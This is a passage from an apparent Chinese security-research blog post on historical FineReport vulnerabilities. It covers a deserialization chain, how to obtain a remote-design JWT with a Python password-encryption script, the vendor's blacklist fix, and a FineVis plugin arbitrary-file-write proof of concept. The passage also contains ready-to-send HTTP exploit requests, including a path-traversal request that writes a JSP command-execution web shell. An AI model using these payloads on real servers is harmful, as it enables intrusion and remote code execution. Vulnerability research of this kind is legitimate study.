+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">at com.fr.third.alibaba.druid.pool.xa.DruidXADataSource.getXAConnection(DruidXADataSource.java:46)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:688)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:772)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ser.BeanSerializer.serialize(BeanSerializer.java:178)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ser.impl.IndexedListSerializer.serializeContents(IndexedListSerializer.java:119)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ser.impl.IndexedListSerializer.serialize(IndexedListSerializer.java:79)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ser.impl.IndexedListSerializer.serialize(IndexedListSerializer.java:18)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ser.DefaultSerializerProvider._serialize(DefaultSerializerProvider.java:479)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ser.DefaultSerializerProvider.serializeValue(DefaultSerializerProvider.java:318)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ObjectMapper._writeValueAndClose(ObjectMapper.java:4719)</span><br><span class="line">at com.fr.third.fasterxml.jackson.databind.ObjectMapper.writeValueAsString(ObjectMapper.java:3964)</span><br><span class="line">at com.fr.json.revise.EmbedJson.encode(EmbedJson.java:99)</span><br><span class="line">at com.fr.json.JSONArray.encode(JSONArray.java:560)</span><br><span class="line">at com.fr.json.JSONArray.toString(JSONArray.java:590)</span><br><span class="line">at com.fr.third.guava.collect.UsingToStringOrdering.compare(UsingToStringOrdering.java:29)</span><br><span class="line">at java.util.TimSort.countRunAndMakeAscending(TimSort.java:355)</span><br><span class="line">at java.util.TimSort.sort(TimSort.java:220)</span><br><span class="line">at java.util.Arrays.sort(Arrays.java:1512)</span><br><span class="line">at com.fr.third.guava.collect.ImmutableSortedSet$Builder.sortAndDedup(ImmutableSortedSet.java:454)</span><br><span class="line">at com.fr.third.guava.collect.ImmutableSortedSet$Builder.build(ImmutableSortedSet.java:564)</span><br><span class="line">at com.fr.third.guava.collect.ImmutableSortedSet$Builder.build(ImmutableSortedSet.java:429)</span><br><span class="line">at com.fr.third.guava.collect.ImmutableSetMultimap.readObject(ImmutableSetMultimap.java:630)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>V11-2025.3.31-11.0.32修复</p>
+<h3 id="V11-鉴权分析"><a href="#V11-鉴权分析" class="headerlink" title="V11 鉴权分析"></a>V11 鉴权分析</h3><p>反序列化链讲完了，不过V11版本只能后台执行。现在分析一下，知道账密的情况下，如何进行后台利用。</p>
+<p>目标是通过validate：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773715982338-e9262366-ec78-4381-b23a-3300d6ae60d6.png"  alt="img"></p>
+<p>能看出来需要一个token，但是哪里产生token呢？下面来分析一下。</p>
+<p>漏洞的路由是，&#x2F;remote&#x2F;design&#x2F;channel，即远程设计相关的一个接口。这里的远程设计指什么？我们知道，帆软报表下载好后，我们都是通过一个designer.exe启动，这就是设计器。我们也可以通过web端进行登录，这个就是服务器。而远程设计，就是指服务器部署在远端，而本地只安装了设计器，我们想要在本地编辑远程的报表，那就需要通过登录，连接到远程的服务器。</p>
+<p>参考官方文档，<a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-1388.html?source=3%EF%BC%8C%E6%96%87%E6%A1%A3%E7%9A%84%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86%E6%9C%89%E6%8F%90%E5%88%B0%E6%80%8E%E4%B9%88%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E6%8C%89%E7%85%A7%E6%96%87%E6%A1%A3%E6%AD%A5%E9%AA%A4%EF%BC%8C%E5%9C%A8%E8%AE%BE%E8%AE%A1%E5%99%A8%E9%87%8C%E5%B0%9D%E8%AF%95%E8%BF%9E%E6%8E%A5%EF%BC%8C%E5%90%8C%E6%97%B6%E5%9C%A8wireshark%E9%87%8C%E5%AF%B98075%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E6%8D%95%E6%8D%89%EF%BC%9A" >https://help.fanruan.com/finereport/doc-view-1388.html?source=3，文档的第三部分有提到怎么连接远程服务器。这里我们按照文档步骤，在设计器里尝试连接，同时在wireshark里对8075端口的流量进行捕捉：<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773717281894-57dafaee-1c2f-4d0a-b84d-fefd53749544.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773717301492-4b405224-1cf6-4cf5-af77-5cdcd3bbd472.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773717317944-ba611149-079b-415b-a501-9c9700cbe56e.png"  alt="img"></p>
+<p>最终就能获取到进行远程登录时，依次访问了哪几个路由：</p>
+<p>&#x2F;webroot&#x2F;decision&#x2F;remote&#x2F;design&#x2F;vt  返回是否支持远程登录</p>
+<p>&#x2F;webroot&#x2F;decision&#x2F;remote&#x2F;design&#x2F;check   返回各种密钥：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773717474572-8f56cd49-a3b2-4e90-9100-d30bbaaad4de.png"  alt="img"></p>
+<p>&#x2F;webroot&#x2F;decision&#x2F;remote&#x2F;design&#x2F;verify   发送用户名，加密后的密码等，返回jwt，即token，这里需要注意一个请求头transEncryptLevel: 1，这个请求头告诉服务器用什么解密方式：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773717602254-55b7e259-183a-4f5f-b4eb-f68cabb27a2b.png"  alt="img"></p>
+<p>虽然现在能够通过抓包获取jwt，但是如果能够知道怎么在代码中直接加密的话，就不用每次都抓包了。所以现在分析一下&#x2F;remote&#x2F;design&#x2F;verify中password的解密过程，尝试反推出加密。</p>
+<p>&#x2F;design&#x2F;verify对应com.fr.decision.extension.report.api.remote.RemoteDesignResource#saferGetRemoteToken</p>
+<p>解密的方法已经明确，这里直接让AI进行分析：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773726894999-3a1af0a3-cb0a-4b5d-9e6b-6a6ad175a333.png"  alt="img"></p>
+<p>不过AI一开始只给出了AES情况和SM4情况的脚本，把&#x2F;check返回的结果给AI，再次分析：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773726997207-5a66f03a-4e8d-4cdd-9a8c-a47684224267.png"  alt="img"></p>
+<p>于是知道了这里应该使用RSA，加密脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_password</span>(<span class="params">plain_password: <span class="built_in">str</span>, encryption_key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    加密远程设计密码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        plain_password: 明文密码</span></span><br><span class="line"><span class="string">        encryption_key: 从 /remote/design/check 接口获取的 encryptionKey</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        Base64 编码的加密密码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 准备 16 字节密钥（取前 16 字节，不足补零）</span></span><br><span class="line">    key_bytes = encryption_key.encode(<span class="string">&#x27;utf-8&#x27;</span>)[:<span class="number">16</span>]</span><br><span class="line">    key_bytes = key_bytes.ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 准备明文数据</span></span><br><span class="line">    plain_bytes = plain_password.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. PKCS5/PKCS7 填充</span></span><br><span class="line">    padded_data = pad(plain_bytes, AES.block_size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. AES/ECB 加密</span></span><br><span class="line">    cipher = AES.new(key_bytes, AES.MODE_ECB)</span><br><span class="line">    encrypted_bytes = cipher.encrypt(padded_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. Base64 编码</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_bytes).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 从 check 接口获取的密钥</span></span><br><span class="line">    encryption_key = <span class="string">&quot;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy4eFv3OWpYQbMztQKuilH5LDCasAphTa\r\nXw5Vodtt4accTo57w42iL6nJ8PsnsC/NvSp0JyluMYtkOBVv75GUCyO5PEP/Oe6AgrEGeP5GXzky\r\nW7us4Qm7Ss71WLPqNhwgkPdzC16aJuwTthLheNGL9XIP7ogmB7EAgSi44ut2B/zknO20ODzWnaR4\r\nExHDo2LpaX0BJszKhSi61k6K81WVl7jFLWflBsx8JCxDIUeX+gG1/d0Rt+ki0MHwbgdSIouQNvRh\r\n1J7pcOIwIQ9gTbvJ/Tu5i1YQM/p2yJo4x5KXIJXBgkAJJgR4USPSxq0b/wNMgfMf7YfspjBdlbUk\r\n+x/7mwIDAQAB&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明文密码</span></span><br><span class="line">    password = <span class="string">&quot;password&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密</span></span><br><span class="line">    encrypted = encrypt_password(password, encryption_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;加密后的密码: <span class="subst">&#123;encrypted&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发包验证：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773727156154-9fcb87f9-7161-4f2e-b617-a7e41eede285.png"  alt="img"></p>
+<p>成功获取到jwt。</p>
+<p>在发送请求包时，在请求头中加入username和token字段即可后台利用。虽然一般不会给测试用户分配远程设计权限，但还是可以尝试一下，配合前面的弱口令漏洞进行利用。</p>
+<p>无权限用户返回：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773804822907-d43499fd-7e4e-4d74-9862-e106e3c087f3.png"  alt="img"></p>
+<h2 id="官方修复-1"><a href="#官方修复-1" class="headerlink" title="官方修复"></a>官方修复</h2><p>先看一下官方黑名单的位置：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773710458970-bffcaf0a-8b1a-4b91-810a-b5bff09497dc.png"  alt="img"></p>
+<p>再看一下具体是怎么加载黑名单的。</p>
+<p>其序列化工具类SerializerHelper中有一个方法safeDeserialize：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711010931-20fce21d-6280-40c9-ad83-2222649c562a.png"  alt="img"></p>
+<p>默认调用SafeSerializerSummaryAdaptor进行反序列化，跟进deserialize：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711054518-d0fa2462-626f-4568-ac23-f8d8cff4414f.png"  alt="img"></p>
+<p>再跟进safeDeserialize，deserialize：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711112349-a306ab1a-6fca-4607-a0da-e1eb715062ad.png"  alt="img"></p>
+<p>这里使用了自定义的ObjectInputStream进行反序列化。</p>
+<p>看一下CustomObjectInputStream：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711171050-c9c2960d-6184-4436-817e-feee5ebea2a6.png"  alt="img"></p>
+<p>实现了resolveClass，并在静态代码块中加载了黑名单。</p>
+<p>除了直接使用com.fr.serialization.SerializerHelper#safeDeserialize，有时候还会使用deserialize并传入SafeInvocationSerializer，流程本质也一样：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773711248102-689175f7-b249-4af6-a7e0-62a0c874cf72.png"  alt="img"></p>
+<h1 id="FineVis插件任意文件写入"><a href="#FineVis插件任意文件写入" class="headerlink" title="FineVis插件任意文件写入"></a>FineVis插件任意文件写入</h1><p>漏洞版本插件：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport/plugins" >https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport/plugins<i class="fas fa-external-link-alt"></i></a></p>
+<p>然后去web端的插件管理中，选择从本地安装即可。</p>
+<h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773718613247-a54b85e4-d1a8-450a-b42c-17a2e0ada291.png"  alt="img"></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webroot/decision/view/duchamp/theme/item/copy</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8075</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-nix">i<span class="attr">d</span><span class="operator">=</span>test&amp;sourceID<span class="operator">=</span>test&amp;config<span class="operator">=</span>&#123;&#125;</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">POST <span class="operator">/</span>webroot<span class="operator">/</span>decision<span class="operator">/</span>view<span class="operator">/</span>duchamp<span class="operator">/</span>theme<span class="operator">/</span>attach<span class="operator">?</span>id<span class="operator">=</span>test&amp;attachID<span class="operator">=</span><span class="number">111</span>&amp;metadata<span class="operator">=</span>%<span class="number">7</span>B%<span class="number">22</span>name%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>..<span class="operator">/</span>..<span class="operator">/</span>..<span class="operator">/</span>..<span class="operator">/</span>test.jsp%<span class="number">22</span>%<span class="number">7</span>D HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> localhost:<span class="number">8075</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> multipart<span class="symbol">/form-data</span>; <span class="attr">boundary</span><span class="operator">=</span><span class="operator">-</span>---WebKitFormBoundary7MA4YWxkTrZu0gW</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="operator">-</span>---WebKitFormBoundary7MA4YWxkTrZu0gW</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Disposition:</span> form-data; <span class="attr">name</span><span class="operator">=</span><span class="string">&quot;file&quot;</span>; <span class="attr">filename</span><span class="operator">=</span><span class="string">&quot;test.txt&quot;</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> text<span class="symbol">/plain</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="operator">&lt;</span>% out.println(<span class="string">&quot;test321abc&quot;</span>) %<span class="operator">&gt;</span></span></span><br><span class="line"><span class="language-nix"><span class="operator">-</span>---WebKitFormBoundary7MA4YWxkTrZu0gW--</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">POST <span class="symbol">/webroot/decision/view/duchamp/theme/resource2template</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> localhost:<span class="number">8075</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/json</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;attachIDs&quot;</span>:[<span class="string">&quot;111&quot;</span>],<span class="string">&quot;reuseIDs&quot;</span>:[<span class="string">&quot;&quot;</span>],<span class="string">&quot;tplPath&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/webroot/test.jsp</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> localhost:<span class="number">8075</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>POC中的三个路由对应三个方法，一个个看。</p>
+<p>1、注册模板</p>
+<p>com.fr.plugin.wysiwyg.web.controller.DuchampThemeRequestService#copy：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773733166058-6e887cdc-44a2-4ab8-b838-cc6ee14bb705.png"  alt="img"></p>
+<p>跟进copy：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773733178784-2e3dfe0f-51f3-4038-a63e-89f0e1b8056b.png"  alt="img"></p>
+<p>这里根据sourceID去FVSTemplateStyleConfig里取出FVSTemplateStyle。不过可以看到，就算sourceID没有对应的模板，也会在if里new一个。所以sourceID随便写就行。</p>
+<p>最后一行会在FVSTemplateStyleConfig更新模板，传入的id与模板对应。</p>
+<p>2、上传模板图片</p>
+<p>com.fr.plugin.wysiwyg.web.controller.DuchampThemeRequestService#uploadAttachImage：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773733372416-8c55514f-fac6-48b2-acbf-332c5e523dd0.png"  alt="img"></p>
+<p>跟进：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773733444536-bd67955d-59d2-4efd-b6eb-b60d823012ab.png"  alt="img"></p>
+<p>首先从模板配置中根据id取出模板，所以这里的id得跟第一个请求中的一样。</p>
+<p>然后向模板中添加附件图片，附件图片与attachID关联。</p>
+<p>接着向模板中添加附件元数据，附件元数据也与attachID关联。</p>
+<p>最后根据id更新模板配置中的模板。</p>
+<p>156、157那两行就是负责从请求中取数据的。</p>
+<p>3、应用附件图片到模板</p>
+<p>com.fr.plugin.wysiwyg.web.controller.DuchampThemeRequestService#applyThemeResource2Tpl：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773733722373-dcae593f-4503-4111-9089-3d53fd2af663.png"  alt="img"></p>
+<p>跟进com.fr.plugin.wysiwyg.web.controller.DuchampThemeRequestHelper#applyThemeResource2Tpl：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773733820507-e8ee81ec-d358-4d2b-bda8-d9ab7b55354b.png"  alt="img"></p>
+<p>跟进id从模板配置中取出模板。</p>
+<p>根据模板中的attachID，依次取出相应的附件图片。</p>
+<p>从元数据中取出name字段，作为写入路径。</p>
+<p>将图片写入指定路径。</p>
+<p>最后整理一下涉及到的几个关键类</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773734492082-80265ec9-c80f-4561-8955-a2aa1e26dfc8.png"  alt="img"></p>
+<h2 id="官方修复-2"><a href="#官方修复-2" class="headerlink" title="官方修复"></a>官方修复</h2><p>最新的4.7.1版本插件中，后面两个请求对应的方法都已经被删除：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773735325796-718b0095-11b2-4eda-925c-8c508d367a2f.png"  alt="img"></p>
+<h1 id="V8-V9老版本漏洞"><a href="#V8-V9老版本漏洞" class="headerlink" title="V8 V9老版本漏洞"></a>V8 V9老版本漏洞</h1><p>因为版本比较老，利用性不高，所以这里仅列举，不做分析，不确保payload能使用。</p>
+<p>1、local_install 文件上传</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2390" >https://forum.butian.net/share/2390<i class="fas fa-external-link-alt"></i></a></p>
+<p>这个是 V8 版本的漏洞了</p>
+<p>2、op&#x3D;chart&amp;cmd&#x3D;get_geo_json 任意文件读取 + fr_log命令执行</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2390" >https://forum.butian.net/share/2390<i class="fas fa-external-link-alt"></i></a></p>
+<p>V8 版本漏洞</p>
+<p>3、任意文件覆盖漏洞</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/z1bracd/SecurityList/blob/5a99da1aa91685827c1e72429fff9dc63ce7967c/Java_OA/FineReportAudit.md#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E" >https://github.com/z1bracd/SecurityList/blob/5a99da1aa91685827c1e72429fff9dc63ce7967c/Java_OA&#x2F;FineReportAudit.md#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/shell.svg.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-vbscript-html"><span class="language-xml">&#123;&quot;__CONTENT__&quot;:&quot;</span><span class="language-vbscript">&lt;% java.io.InputStream <span class="keyword">in</span> = Runtime.getRun<span class="built_in">time</span>().exec(<span class="built_in">request</span>.getParameter(\<span class="string">&quot;cmd\&quot;</span>)).getInputStream();int a = <span class="number">-1</span>;byte[] b = <span class="keyword">new</span> byte[<span class="number">2048</span>];<span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=<span class="number">-1</span>)&#123;out.println(<span class="keyword">new</span> <span class="built_in">String</span>(b));&#125;%&gt;</span><span class="language-xml">&quot;,&quot;__CHARSET__&quot;:&quot;UTF-8&quot;&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>V9 版本漏洞</p>
+<p>4、实战深度利用</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/AgMYcyq_TE4X8MvZ7cjiPQ" >https://mp.weixin.qq.com/s/AgMYcyq_TE4X8MvZ7cjiPQ<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>主要记录一些官方文档的位置：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-4833.html" >https://help.fanruan.com/finereport/doc-view-4833.html<i class="fas fa-external-link-alt"></i></a>    安全漏洞声明</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-1388.html?source=3" >https://help.fanruan.com/finereport/doc-view-1388.html?source=3<i class="fas fa-external-link-alt"></i></a>  远程设计相关</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/11/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90" >https://blog.potatowo.top/2024/11/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2806" >https://forum.butian.net/share/2806<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/LiangYueSec/article/details/142096830" >https://blog.csdn.net/LiangYueSec/article/details/142096830<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14869" >https://xz.aliyun.com/news/14869<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://b1ue.cn/archives/458.html" >https://b1ue.cn/archives/458.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9675" >https://xz.aliyun.com/news/9675<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2390" >https://forum.butian.net/share/2390<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/z1bracd/SecurityList/blob/5a99da1aa91685827c1e72429fff9dc63ce7967c/Java_OA/FineReportAudit.md#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E" >https://github.com/z1bracd/SecurityList/blob/5a99da1aa91685827c1e72429fff9dc63ce7967c/Java_OA&#x2F;FineReportAudit.md#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/AgMYcyq_TE4X8MvZ7cjiPQ" >https://mp.weixin.qq.com/s/AgMYcyq_TE4X8MvZ7cjiPQ<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                帆软报表FineReport历史漏洞分析（二）
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/03/20/帆软报表FineReport历史漏洞分析（二）/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
